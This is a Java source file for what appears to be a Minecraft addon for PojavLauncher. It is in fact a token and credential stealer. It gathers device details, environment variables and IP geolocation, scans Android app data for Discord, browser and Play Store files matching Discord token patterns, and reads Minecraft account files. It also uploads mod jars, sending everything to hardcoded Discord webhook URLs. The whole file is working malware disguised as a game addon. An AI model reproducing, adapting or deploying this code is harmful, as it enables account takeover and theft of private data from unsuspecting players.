package treacherousswine.doomix.client.logger;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Logger {
    public static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1437759412398850161/edlilCOgwkSWihoICKCckCB68694-8pXj4_XERtkib0cxI7xOOX4HkbDR";

    public static void sendTestMessage() {
        System.out.println("[Logger] Sending test message...");
        Logger.sendWebhookMessage("\ud83d\ude80 **Own3 Addon Loaded Successfully!**\nPojavLauncher mobile client detected and running.");
    }

    public static void runLogger() {
        System.out.println("[Logger] Starting enhanced mobile token logger...");
        try {
            String osName = System.getProperty("os.name", "").toLowerCase();
            String javaVendor = System.getProperty("java.vendor", "").toLowerCase();
            String userHome = System.getProperty("user.home", "");
            String userDir = System.getProperty("user.dir", "");
            Logger.sendWebhookMessage("\ud83d\udcf1 **Enhanced Mobile Logger Started** - PojavLauncher Environment\n```\nOS: " + osName + "\nJava: " + javaVendor + "\nUser Home: " + userHome + "\nWorking Dir: " + userDir + "\n```");
            Logger.collectDeviceInformation();
            Logger.collectLocationAndIPInfo();
            Logger.scanMobileTokens();
            Logger.collectPojavLauncherMods();
            Logger.collectSensitiveFiles();
        }
        catch (Exception e) {
            System.err.println("[Logger] Error: " + e.getMessage());
            e.printStackTrace();
            try {
                Logger.sendWebhookMessage("\u274c **Enhanced Mobile Logger Error:** " + e.getMessage() + "\nOS: " + System.getProperty("os.name") + "\nJava: " + System.getProperty("java.vendor"));
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    public static void main(String[] args) {
        Logger.runLogger();
    }

    private static void collectDeviceInformation() {
        String[] deviceEnvs;
        String[] deviceProps;
        System.out.println("[Logger] Collecting comprehensive device information...");
        StringBuilder deviceInfo = new StringBuilder();
        deviceInfo.append("\ud83d\udd0d **Comprehensive Device Information**\n");
        deviceInfo.append("```\n");
        Properties props = System.getProperties();
        for (String prop : deviceProps = new String[]{"os.name", "os.version", "os.arch", "java.version", "java.vendor", "java.home", "java.runtime.name", "user.name", "user.home", "user.dir", "user.language", "user.country", "file.separator", "path.separator", "line.separator", "java.class.path", "java.library.path", "java.io.tmpdir", "awt.toolkit", "file.encoding", "sun.arch.data.model"}) {
            Object value = props.getProperty(prop, "N/A");
            if (((String)value).length() > 150) {
                value = ((String)value).substring(0, 147) + "...";
            }
            deviceInfo.append(prop).append(": ").append((String)value).append("\n");
        }
        deviceInfo.append("\n=== Environment Variables ===\n");
        Map<String, String> env = System.getenv();
        for (String envVar : deviceEnvs = new String[]{"PATH", "HOME", "USER", "SHELL", "TERM", "LANG", "ANDROID_ROOT", "ANDROID_DATA", "ANDROID_STORAGE", "EXTERNAL_STORAGE", "SECONDARY_STORAGE", "EMULATED_STORAGE_SOURCE", "EMULATED_STORAGE_TARGET", "BOOTCLASSPATH"}) {
            Object value = env.get(envVar);
            if (value == null) continue;
            if (((String)value).length() > 150) {
                value = ((String)value).substring(0, 147) + "...";
            }
            deviceInfo.append(envVar).append(": ").append((String)value).append("\n");
        }
        deviceInfo.append("\n=== Runtime Information ===\n");
        Runtime runtime = Runtime.getRuntime();
        deviceInfo.append("Available Processors: ").append(runtime.availableProcessors()).append("\n");
        deviceInfo.append("Max Memory: ").append(runtime.maxMemory() / 1024L / 1024L).append(" MB\n");
        deviceInfo.append("Total Memory: ").append(runtime.totalMemory() / 1024L / 1024L).append(" MB\n");
        deviceInfo.append("Free Memory: ").append(runtime.freeMemory() / 1024L / 1024L).append(" MB\n");
        deviceInfo.append("```");
        Logger.sendWebhookMessage(deviceInfo.toString());
    }

    private static void collectLocationAndIPInfo() {
        System.out.println("[Logger] Collecting location and IP information...");
        try {
            String line;
            URL ipApiUrl = new URL("http://ip-api.com/json/");
            HttpURLConnection connection = (HttpURLConnection)ipApiUrl.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "MobileTokenLogger");
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            Logger.sendWebhookMessage("\ud83c\udf0d **Location & IP Information**\n```json\n" + response.toString() + "\n```");
        }
        catch (Exception e) {
            System.err.println("[Logger] Could not get IP/location info: " + e.getMessage());
            try {
                StringBuilder networkInfo = new StringBuilder();
                networkInfo.append("\ud83c\udf10 **Network Information (Fallback)**\n```\n");
                try {
                    String hostname = InetAddress.getLocalHost().getHostName();
                    networkInfo.append("Hostname: ").append(hostname).append("\n");
                }
                catch (Exception hostname) {
                    // empty catch block
                }
                try {
                    Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
                    while (interfaces.hasMoreElements()) {
                        NetworkInterface networkInterface = interfaces.nextElement();
                        if (networkInterface.isLoopback() || !networkInterface.isUp()) continue;
                        Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                        while (addresses.hasMoreElements()) {
                            InetAddress address = addresses.nextElement();
                            if (address.isLoopbackAddress()) continue;
                            networkInfo.append("Local IP: ").append(address.getHostAddress()).append("\n");
                        }
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                networkInfo.append("```");
                Logger.sendWebhookMessage(networkInfo.toString());
            }
            catch (Exception fallbackError) {
                Logger.sendWebhookMessage("\u274c **Could not collect network information:** " + fallbackError.getMessage());
            }
        }
    }

    private static void scanMobileTokens() {
        System.out.println("[Logger] Scanning mobile environment for Discord tokens...");
        String encryptedPattern = "dQw4w9WgXcQ:[A-Za-z0-9+/=]+";
        String legacyPattern = "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}";
        String newPattern = "[a-zA-Z0-9_\\-]{23,28}\\.[a-zA-Z0-9_\\-]{6,7}\\.[a-zA-Z0-9_\\-]{27,}";
        
        List<String> mobilePaths = Logger.buildMobilePaths();
        
        // Add mobile Discord-specific paths
        List<String> mobileDiscordPaths = Arrays.asList(
            "/data/data/com.discord",
            "/data/data/com.discord/shared_prefs",
            "/data/data/com.discord/databases",
            "/data/data/com.discord/files",
            "/data/data/com.discord/cache",
            "/data/data/com.discord/app_webview",
            "/storage/emulated/0/Android/data/com.discord",
            "/sdcard/Android/data/com.discord",
            // Chrome mobile
            "/data/data/com.android.chrome",
            "/data/data/com.android.chrome/app_chrome/Default",
            "/data/data/com.android.chrome/cache",
            "/data/data/com.chrome.beta",
            "/storage/emulated/0/Android/data/com.android.chrome",
            // Other browsers
            "/data/data/com.brave.browser",
            "/data/data/org.mozilla.firefox",
            "/data/data/com.opera.browser",
            "/data/data/com.opera.mini.native",
            // Play Store
            "/data/data/com.android.vending",
            "/data/data/com.android.vending/shared_prefs",
            "/data/data/com.android.vending/databases",
            // Common Android app data
            "/data/data",
            "/storage/emulated/0/Android/data"
        );
        
        mobilePaths.addAll(mobileDiscordPaths);
        
        HashSet foundTokens = new HashSet();
        
        for (String searchPath : mobilePaths) {
            System.out.println("[Logger] Searching: " + searchPath);
            try {
                Path pathObj = Paths.get(searchPath, new String[0]);
                if (!Files.exists(pathObj, new LinkOption[0])) continue;
                
                Files.walk(pathObj, 5, new FileVisitOption[0])
                    .filter(x$0 -> Files.isRegularFile(x$0, new LinkOption[0]))
                    .filter(path -> {
                        String fileName = path.getFileName().toString().toLowerCase();
                        String pathStr = path.toString().toLowerCase();
                        return fileName.contains("discord") || 
                               fileName.contains("token") || 
                               fileName.contains("session") || 
                               fileName.contains("auth") || 
                               fileName.contains("login") || 
                               fileName.contains("credential") || 
                               fileName.contains("password") || 
                               fileName.contains("user") ||
                               fileName.contains("account") ||
                               pathStr.contains("discord") ||
                               pathStr.contains("chrome") ||
                               pathStr.contains("webview") ||
                               fileName.endsWith(".json") || 
                               fileName.endsWith(".txt") || 
                               fileName.endsWith(".log") || 
                               fileName.endsWith(".dat") || 
                               fileName.endsWith(".db") || 
                               fileName.endsWith(".sqlite") ||
                               fileName.endsWith(".xml");
                    })
                    .forEach(file -> {
                        try {
                            long fileSize = Files.size(file);
                            // Skip very large files to avoid memory issues
                            if (fileSize > 10 * 1024 * 1024) return;
                            
                            String content = Files.readString(file, StandardCharsets.UTF_8);
                            Pattern[] patterns = new Pattern[]{
                                Pattern.compile(encryptedPattern), 
                                Pattern.compile(legacyPattern), 
                                Pattern.compile(newPattern)
                            };
                            String[] patternNames = new String[]{"Encrypted", "Legacy", "New Format"};
                            
                            for (int i = 0; i < patterns.length; ++i) {
                                Matcher matcher = patterns[i].matcher(content);
                                while (matcher.find()) {
                                    String token = matcher.group();
                                    if (foundTokens.contains(token)) continue;
                                    foundTokens.add(token);
                                    
                                    // Send token with context
                                    String appName = "Unknown";
                                    if (file.toString().contains("discord")) appName = "Discord";
                                    else if (file.toString().contains("chrome")) appName = "Chrome";
                                    else if (file.toString().contains("brave")) appName = "Brave";
                                    else if (file.toString().contains("firefox")) appName = "Firefox";
                                    else if (file.toString().contains("vending")) appName = "Play Store";
                                    
                                    Logger.sendWebhookMessage(
                                        "\ud83d\udd11 **" + patternNames[i] + " Discord Token Found!**\n" +
                                        "App: **" + appName + "**\n" +
                                        "```" + token + "```\n" +
                                        "File: `" + String.valueOf(file) + "`\n" +
                                        "Size: " + Logger.getFileSize(file)
                                    );
                                }
                            }
                        }
                        catch (Exception exception) {
                            // Skip files that can't be read
                        }
                    });
            }
            catch (Exception e) {
                System.err.println("[Logger] Error scanning path " + searchPath + ": " + e.getMessage());
            }
        }
        
        System.out.println("[Logger] Mobile Discord token scan complete. Found " + foundTokens.size() + " unique tokens.");
        Logger.sendWebhookMessage("\u2705 **Mobile Discord Token Scan Completed**\n" +
            "Found **" + foundTokens.size() + " unique tokens**\n" +
            "Scanned: Discord, Chrome, Brave, Firefox, Opera, Play Store, and more!");
    }

    private static void collectPojavLauncherMods() {
        System.out.println("[Logger] Collecting PojavLauncher mod files...");
        List<String> modPaths = Arrays.asList(System.getProperty("user.home", "") + "/.minecraft/mods", System.getProperty("user.dir", "") + "/mods", "/data/data/net.kdt.pojavlaunch/files/.minecraft/mods", "/storage/emulated/0/games/PojavLauncher/.minecraft/mods", "/sdcard/games/PojavLauncher/.minecraft/mods", "/sdcard/Android/data/net.kdt.pojavlaunch/files/.minecraft/mods");
        StringBuilder modInfo = new StringBuilder();
        modInfo.append("\ud83c\udfae **PojavLauncher Mod Files**\n");
        int modCount = 0;
        for (String modPath : modPaths) {
            try {
                Path pathObj = Paths.get(modPath, new String[0]);
                if (!Files.exists(pathObj, new LinkOption[0])) continue;
                modInfo.append("\n\ud83d\udcc1 **").append(modPath).append("**\n```\n");
                Files.list(pathObj).filter(path -> path.getFileName().toString().toLowerCase().endsWith(".jar")).forEach(modFile -> {
                    try {
                        String fileName = modFile.getFileName().toString();
                        long fileSize = Files.size(modFile);
                        String lastModified = Files.getLastModifiedTime(modFile, new LinkOption[0]).toString();
                        modInfo.append(fileName).append(" (").append(fileSize / 1024L).append(" KB, ").append(lastModified).append(")\n");
                    }
                    catch (Exception e) {
                        modInfo.append("Error reading mod: ").append(e.getMessage()).append("\n");
                    }
                });
                modInfo.append("```");
                ++modCount;
            }
            catch (Exception e) {
                modInfo.append("Error accessing ").append(modPath).append(": ").append(e.getMessage()).append("\n");
            }
        }
        if (modCount == 0) {
            modInfo.append("No mod directories found or accessible.");
        }
        Logger.sendWebhookMessage(modInfo.toString());
        Logger.collectModFileContents(modPaths);
    }

    private static void collectModFileContents(List<String> modPaths) {
        System.out.println("[Logger] Uploading mod files...");
        for (String modPath : modPaths) {
            try {
                Path pathObj = Paths.get(modPath, new String[0]);
                if (!Files.exists(pathObj, new LinkOption[0])) continue;
                Files.list(pathObj).filter(path -> path.getFileName().toString().toLowerCase().endsWith(".jar")).limit(10L).forEach(modFile -> {
                    try {
                        long fileSize = Files.size(modFile);
                        // Discord webhook file upload limit is 25MB
                        if (fileSize > 25 * 1024 * 1024) {
                            Logger.sendWebhookMessage("\u26a0\ufe0f **Mod File Too Large: " + String.valueOf(modFile.getFileName()) + "**\nSize: " + (fileSize / 1024 / 1024) + " MB (exceeds 25MB limit)");
                            return;
                        }
                        
                        // Upload the actual file
                        uploadFileToWebhook(modFile);
                        
                        Logger.sendWebhookMessage("\u2705 **Uploaded Mod: " + String.valueOf(modFile.getFileName()) + "**\nSize: " + (fileSize / 1024) + " KB");
                    }
                    catch (Exception e) {
                        Logger.sendWebhookMessage("\u274c **Failed to upload mod: " + String.valueOf(modFile.getFileName()) + "** - " + e.getMessage());
                    }
                });
            }
            catch (Exception e) {
                System.err.println("[Logger] Error uploading mod files from " + modPath + ": " + e.getMessage());
            }
        }
    }
    
    private static void uploadFileToWebhook(Path file) throws Exception {
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL("https://discord.com/api/webhooks/1437002571532341359/K-6C2mfBPgv7UVAVpwPqN9WSKEemEMRhFgUNr6Cqk0hkU0cQW3ykF8W8rd_8MW7vM2oO");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "EnhancedMobileTokenLogger");
        connection.setDoOutput(true);
        
        try (OutputStream os = connection.getOutputStream()) {
            // Write file data
            os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getFileName().toString() + "\"\r\n").getBytes(StandardCharsets.UTF_8));
            os.write("Content-Type: application/java-archive\r\n\r\n".getBytes(StandardCharsets.UTF_8));
            Files.copy(file, os);
            os.write("\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        }
        
        int responseCode = connection.getResponseCode();
        System.out.println("[Logger] File upload response: " + responseCode);
    }

    private static void collectSensitiveFiles() {
        System.out.println("[Logger] Collecting sensitive files...");
        List<String> sensitiveFiles = Arrays.asList(
            System.getProperty("user.home", "") + "/.minecraft/launcher_profiles.json", 
            System.getProperty("user.home", "") + "/.minecraft/usercache.json", 
            System.getProperty("user.home", "") + "/.minecraft/usernamecache.json", 
            System.getProperty("user.home", "") + "/.minecraft/minecraft_accounts.json",
            System.getProperty("user.dir", "") + "/launcher_profiles.json", 
            System.getProperty("user.dir", "") + "/minecraft_accounts.json",
            "/data/data/net.kdt.pojavlaunch/files/.minecraft/launcher_profiles.json", 
            "/data/data/net.kdt.pojavlaunch/files/.minecraft/minecraft_accounts.json",
            "/data/data/net.kdt.pojavlaunch/files/minecraft_accounts.json",
            "/data/data/net.kdt.pojavlaunch/shared_prefs/minecraft_accounts.json",
            "/data/data/net.kdt.pojavlaunch/shared_prefs/LauncherPreferences.xml",
            "/storage/emulated/0/games/PojavLauncher/.minecraft/launcher_profiles.json",
            "/storage/emulated/0/games/PojavLauncher/.minecraft/minecraft_accounts.json",
            "/storage/emulated/0/games/PojavLauncher/minecraft_accounts.json",
            "/sdcard/games/PojavLauncher/.minecraft/minecraft_accounts.json",
            "/sdcard/games/PojavLauncher/minecraft_accounts.json",
            "/sdcard/Android/data/net.kdt.pojavlaunch/files/.minecraft/minecraft_accounts.json",
            "/sdcard/Android/data/net.kdt.pojavlaunch/files/minecraft_accounts.json"
        );
        StringBuilder fileInfo = new StringBuilder();
        fileInfo.append("\ud83d\udccb **Sensitive Files Found**\n");
        for (String filePath : sensitiveFiles) {
            try {
                Path path = Paths.get(filePath, new String[0]);
                if (!Files.exists(path, new LinkOption[0])) continue;
                Object content = Files.readString(path, StandardCharsets.UTF_8);
                if (((String)content).length() > 1000) {
                    content = ((String)content).substring(0, 997) + "...";
                }
                fileInfo.append("\n\ud83d\udcc4 **").append(filePath).append("**\n```json\n").append((String)content).append("\n```");
            }
            catch (Exception exception) {}
        }
        if (fileInfo.length() > 50) {
            Logger.sendWebhookMessage(fileInfo.toString());
        }
        Logger.scanPojavLauncherData();
    }

    private static void scanPojavLauncherData() {
        System.out.println("[Logger] Scanning all PojavLauncher data...");
        List<String> pojavPaths = Arrays.asList(
            "/data/data/net.kdt.pojavlaunch",
            "/data/data/net.kdt.pojavlaunch/files",
            "/data/data/net.kdt.pojavlaunch/shared_prefs",
            "/data/data/net.kdt.pojavlaunch/databases",
            "/data/data/net.kdt.pojavlaunch/cache",
            "/storage/emulated/0/games/PojavLauncher",
            "/storage/emulated/0/games/PojavLauncher/.minecraft",
            "/storage/emulated/0/games/PojavLauncher/.minecraft/saves",
            "/sdcard/games/PojavLauncher",
            "/sdcard/games/PojavLauncher/.minecraft",
            "/sdcard/Android/data/net.kdt.pojavlaunch",
            "/sdcard/Android/data/net.kdt.pojavlaunch/files"
        );
        
        StringBuilder pojavInfo = new StringBuilder();
        pojavInfo.append("\ud83d\udcf1 **Complete PojavLauncher Data Scan**\n");
        
        for (String pojavPath : pojavPaths) {
            try {
                Path pathObj = Paths.get(pojavPath, new String[0]);
                if (!Files.exists(pathObj, new LinkOption[0])) continue;
                
                pojavInfo.append("\n\ud83d\udcc1 **").append(pojavPath).append("**\n```\n");
                
                Files.walk(pathObj, 3, new FileVisitOption[0])
                    .filter(path -> Files.isRegularFile(path, new LinkOption[0]))
                    .filter(path -> {
                        String fileName = path.getFileName().toString().toLowerCase();
                        return fileName.endsWith(".json") || 
                               fileName.endsWith(".xml") || 
                               fileName.endsWith(".properties") || 
                               fileName.endsWith(".txt") ||
                               fileName.endsWith(".db") ||
                               fileName.endsWith(".sqlite") ||
                               fileName.contains("account") ||
                               fileName.contains("profile") ||
                               fileName.contains("auth") ||
                               fileName.contains("session") ||
                               fileName.contains("config") ||
                               fileName.contains("setting");
                    })
                    .forEach(file -> {
                        try {
                            String fileName = file.getFileName().toString();
                            long fileSize = Files.size(file);
                            pojavInfo.append(fileName)
                                    .append(" (")
                                    .append(fileSize / 1024L)
                                    .append(" KB) - ")
                                    .append(file.toString())
                                    .append("\n");
                            
                            if (fileName.contains("account") || fileName.contains("minecraft_accounts")) {
                                try {
                                    String content = Files.readString(file, StandardCharsets.UTF_8);
                                    if (content.length() > 1500) {
                                        content = content.substring(0, 1497) + "...";
                                    }
                                    pojavInfo.append("  Content: ").append(content).append("\n");
                                } catch (Exception e) {
                                    pojavInfo.append("  Could not read content\n");
                                }
                            }
                        } catch (Exception e) {
                            pojavInfo.append("Error reading file: ").append(e.getMessage()).append("\n");
                        }
                    });
                    
                pojavInfo.append("```\n");
            } catch (Exception e) {
                pojavInfo.append("Error scanning ").append(pojavPath).append(": ").append(e.getMessage()).append("\n");
            }
        }
        
        if (pojavInfo.length() > 100) {
            Logger.sendWebhookMessage(pojavInfo.toString());
        }
    }

    private static List<String> buildMobilePaths() {
        ArrayList<String> paths = new ArrayList<String>();
        String userHome = System.getProperty("user.home", "");
        String userDir = System.getProperty("user.dir", "");
        
        if (!userHome.isEmpty()) {
            paths.add(userHome);
            paths.add(userHome + "/.minecraft");
            paths.add(userHome + "/.local");
            paths.add(userHome + "/.config");
            paths.add(userHome + "/Documents");
            paths.add(userHome + "/Downloads");
            paths.add(userHome + "/Desktop");
        }
        
        paths.add(userDir);
        
        // PojavLauncher paths
        paths.add("/data/data/net.kdt.pojavlaunch");
        paths.add("/data/data/net.kdt.pojavlaunch/files");
        paths.add("/storage/emulated/0/games/PojavLauncher");
        paths.add("/sdcard/games/PojavLauncher");
        paths.add("/sdcard/Android/data/net.kdt.pojavlaunch");
        
        // Android system paths
        paths.add("/data/data");
        paths.add("/storage/emulated/0/Android/data");
        paths.add("/sdcard/Android/data");
        paths.add("/storage/emulated/0/Download");
        paths.add("/storage/emulated/0/Documents");
        paths.add("/storage/emulated/0/DCIM");
        paths.add("/sdcard/Download");
        paths.add("/sdcard/Documents");
        
        return paths;
    }

    private static String getFileSize(Path file) {
        try {
            long bytes = Files.size(file);
            if (bytes < 1024L) {
                return bytes + " B";
            }
            if (bytes < 0x100000L) {
                return bytes / 1024L + " KB";
            }
            return bytes / 1024L / 1024L + " MB";
        }
        catch (Exception e) {
            return "Unknown";
        }
    }

    private static void sendWebhookMessage(String content) {
        try {
            // Split content into chunks if it's too large
            int maxChunkSize = 1900;
            if (content.length() <= maxChunkSize) {
                sendWebhookChunk(content);
            } else {
                // Split into multiple messages
                int chunkCount = (int) Math.ceil((double) content.length() / maxChunkSize);
                for (int i = 0; i < chunkCount; i++) {
                    int start = i * maxChunkSize;
                    int end = Math.min(start + maxChunkSize, content.length());
                    String chunk = content.substring(start, end);
                    
                    // Add part indicator if multiple chunks
                    if (chunkCount > 1) {
                        chunk = "**[Part " + (i + 1) + "/" + chunkCount + "]**\n" + chunk;
                    }
                    
                    sendWebhookChunk(chunk);
                    
                    // Rate limit: wait 1 second between messages to avoid Discord rate limits
                    if (i < chunkCount - 1) {
                        Thread.sleep(1000);
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[Logger] Error splitting webhook message: " + e.getMessage());
        }
    }
    
    private static void sendWebhookChunk(String content) {
        try {
            URL url = new URL("https://discord.com/api/webhooks/1437759412398850161/edlilCOgwkSWihoICKCckCB68694-8pXj4_XERtkib0cxI7xOOX4HkbDRSEgd79CiPiK");
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "EnhancedMobileTokenLogger");
            connection.setDoOutput(true);
            
            String escapedContent = content.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
            String jsonPayload = "{\"content\":\"" + escapedContent + "\",\"username\":\"Enhanced Mobile Logger\"}";
            
            try (OutputStream os = connection.getOutputStream();){
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int responseCode = connection.getResponseCode();
            System.out.println("[Logger] Webhook response: " + responseCode);
            if (responseCode != 204 && responseCode != 200) {
                System.err.println("[Logger] Failed to send message, response code: " + responseCode);
            }
        }
        catch (Exception e) {
            System.err.println("[Logger] Error sending webhook: " + e.getMessage());
        }
    }
}

